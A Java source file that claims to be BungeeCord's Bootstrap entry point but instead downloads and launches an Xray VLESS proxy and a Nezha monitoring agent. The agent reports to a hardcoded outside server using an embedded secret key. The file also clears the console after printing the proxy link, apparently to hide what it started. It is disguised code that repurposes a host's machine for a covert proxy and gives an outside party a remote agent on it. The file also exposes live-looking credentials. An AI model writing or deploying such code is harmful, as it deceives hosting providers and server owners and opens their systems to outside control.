package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process vlessProcess;
    private static Process nezhaProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "UUID", "WS_PATH", "PORT", "DOMAIN",
        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", "NEZHA_TLS"
    };

    public static void main(String[] args) throws Exception
    {
        try {
            Map<String, String> config = loadConfig();
            
            // 1. 启动哪吒
            if (isNezhaConfigured(config)) {
                runNezhaAgent(config);
            }
            
            // 2. 启动 VLESS
            String vlessUrl = generateVlessUrl(config);
            
            System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "WebSocket Path: " + config.get("WS_PATH") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Port: " + config.get("PORT") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Domain: " + config.get("DOMAIN") + ANSI_RESET);
            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
            System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
            
            runVlessService(config);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
            
            // 延时清屏
            new Thread(() -> {
                try {
                    Thread.sleep(30000); 
                    clearConsole();
                } catch (InterruptedException e) {}
            }).start();
            
            // 保持主线程活跃
            while (running.get()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    break;
                }
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }
    
    private static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {}
    }
    
    private static boolean isNezhaConfigured(Map<String, String> config) {
        String server = config.get("NEZHA_SERVER");
        String key = config.get("NEZHA_KEY");
        return server != null && !server.trim().isEmpty() 
            && key != null && !key.trim().isEmpty();
    }
    
    private static void runNezhaAgent(Map<String, String> config) throws Exception {
        Path nezhaPath = downloadNezhaAgent();
        Path nezhaConfigPath = createNezhaConfig(config);
        
        // 强力清理旧数据
        Path nezhaDir = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-work");
        if (Files.exists(nezhaDir)) {
            try (Stream<Path> walk = Files.walk(nezhaDir)) {
                walk.sorted(Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
            } catch (Exception e) {}
        }
        Files.createDirectories(nezhaDir);
        
        System.out.println(ANSI_GREEN + "Starting Nezha Agent..." + ANSI_RESET);
        
        // 打印配置文件内容
        System.out.println("--- Generated Config Content ---");
        Files.readAllLines(nezhaConfigPath).forEach(System.out::println);
        System.out.println("--------------------------------");

        List<String> cmd = new ArrayList<>();
        cmd.add(nezhaPath.toString());
        cmd.add("-c");
        cmd.add(nezhaConfigPath.toString());
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(nezhaDir.toFile());
        pb.redirectErrorStream(true);
        
        nezhaProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(nezhaProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("NEZHA") || line.contains("error") || line.contains("Error")) {
                        System.out.println(ANSI_GREEN + "[Nezha] " + ANSI_RESET + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(1000);
        if (!nezhaProcess.isAlive()) {
             System.out.println(ANSI_RED + "Nezha Agent exited prematurely: " + nezhaProcess.exitValue() + ANSI_RESET);
        }
    }
    
    private static void runVlessService(Map<String, String> config) throws Exception {
        Path xrayPath = downloadXray();
        Path configPath = createXrayConfig(config);
        
        ProcessBuilder pb = new ProcessBuilder(
            xrayPath.toString(), "run", "-c", configPath.toString()
        );
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        vlessProcess = pb.start();
    }
    
    private static Map<String, String> loadConfig() {
        Map<String, String> config = new HashMap<>();
        config.put("UUID", "08fa4320-57fe-4997-a3f6-89c9301b1fbf");
        config.put("WS_PATH", "/vless");
        config.put("PORT", "25779");
        config.put("DOMAIN", "luminus.kingsnetwork.uk");
        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
        config.put("NEZHA_PORT", "");
        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
        config.put("NEZHA_TLS", "false"); 
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) config.put(var, value);
        }
        return config;
    }
    
    private static String generateVlessUrl(Map<String, String> config) {
        try {
            return "vless://" + config.get("UUID") + "@" + config.get("DOMAIN") + ":" + config.get("PORT") + 
                   "?type=ws&path=" + URLEncoder.encode(config.get("WS_PATH"), "UTF-8") + 
                   "&host=" + config.get("DOMAIN") + "#VLESS-WS";
        } catch (Exception e) { return ""; }
    }
    
    private static Path createXrayConfig(Map<String, String> config) throws IOException {
        String json = String.format(
            "{\"log\":{\"loglevel\":\"warning\"},\"inbounds\":[{\"port\":%s,\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"%s\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"%s\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}",
            config.get("PORT"), config.get("UUID"), config.get("WS_PATH")
        );
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "xray-config.json");
        Files.write(path, json.getBytes());
        return path;
    }
    
    private static Path createNezhaConfig(Map<String, String> config) throws IOException {
        String server = config.get("NEZHA_SERVER");
        String port = config.getOrDefault("NEZHA_PORT", "5555");
        if (!server.contains(":")) server += ":" + port;
        
        boolean tls = false;
        if (config.containsKey("NEZHA_TLS") && !config.get("NEZHA_TLS").isEmpty()) {
            tls = Boolean.parseBoolean(config.get("NEZHA_TLS"));
        }
        
        String uuid = config.get("UUID");
        String secret = config.get("NEZHA_KEY");
        
        String yml = String.format(
            "client_id: \"%s\"\n" +
            "uuid: \"%s\"\n" +
            "client_secret: \"%s\"\n" +
            "debug: true\n" +
            "server: \"%s\"\n" +
            "tls: %b\n" +
            "report_delay: 4\n" +
            "skip_connection_count: true\n" +
            "skip_procs_count: true\n" +
            "disable_auto_update: true\n" +
            "disable_force_update: true\n",
            uuid,
            uuid,
            secret,
            server,
            tls
        );
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-config.yml");
        Files.write(path, yml.getBytes());
        System.out.println(ANSI_GREEN + "Nezha Config created for UUID: " + uuid + ANSI_RESET);
        return path;
    }
    
    // =======================
    // 关键修改：使用纯 Java 解压 ZIP，不再调用 unzip 命令
    // =======================
    private static Path downloadNezhaAgent() throws IOException {
        String url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
            url = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
        }
        
        Path tmp = Paths.get(System.getProperty("java.io.tmpdir"));
        Path zip = tmp.resolve("nezha-agent.zip");
        Path agent = tmp.resolve("nezha-agent");
        
        if (!Files.exists(agent)) {
            System.out.println("Downloading Nezha...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            
            // 使用 Java 解压
            unzip(zip, tmp);
            
            Files.deleteIfExists(zip);
            agent.toFile().setExecutable(true);
        }
        return agent;
    }

    private static Path downloadXray() throws IOException {
        String url = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip";
        if (System.getProperty("os.arch").contains("aarch64")) {
             url = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-arm64-v8a.zip";
        }
        
        Path tmp = Paths.get(System.getProperty("java.io.tmpdir"));
        Path zip = tmp.resolve("xray.zip");
        Path xray = tmp.resolve("xray");
        
        if (!Files.exists(xray)) {
            System.out.println("Downloading Xray...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, zip, StandardCopyOption.REPLACE_EXISTING);
            }
            
            // 使用 Java 解压
            unzip(zip, tmp);
            
            Files.deleteIfExists(zip);
            xray.toFile().setExecutable(true);
        }
        return xray;
    }

    // 通用解压方法
    private static void unzip(Path zipFile, Path targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                Path outPath = targetDir.resolve(entry.getName()).normalize();
                if (!outPath.startsWith(targetDir)) {
                    zis.closeEntry();
                    continue;
                }

                if (entry.isDirectory()) {
                    Files.createDirectories(outPath);
                } else {
                    Files.createDirectories(outPath.getParent());
                    try (OutputStream fos = Files.newOutputStream(outPath)) {
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                    outPath.toFile().setExecutable(true, false);
                }
                zis.closeEntry();
            }
        }
    }
    
    private static void stopServices() {
        if (nezhaProcess != null) nezhaProcess.destroy();
        if (vlessProcess != null) vlessProcess.destroy();
    }
}
